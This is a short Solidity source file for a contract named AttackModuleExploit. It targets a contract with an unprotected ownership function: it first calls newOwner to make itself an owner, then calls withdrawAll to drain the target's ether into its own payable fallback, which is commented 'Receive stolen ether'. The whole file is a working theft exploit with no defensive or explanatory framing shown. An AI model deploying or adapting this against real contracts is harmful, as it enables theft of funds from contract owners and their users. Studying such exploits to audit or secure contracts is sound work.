pragma solidity ^0.4.23;

interface IVulnerable {
    function newOwner(address _owner) external returns (bool);
    function withdrawAll() external;
    function () external payable;
}

contract AttackModuleExploit {
    address public target;

    constructor(address _target) public {
        target = _target;
    }

    // Step 1: Become an owner
    function becomeOwner() public {
        IVulnerable(target).newOwner(address(this));
    }

    // Step 2: Drain all ether
    function attack() public {
        IVulnerable(target).withdrawAll();
    }

    // Receive stolen ether
    function () external payable {}

    // Helper: Get balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

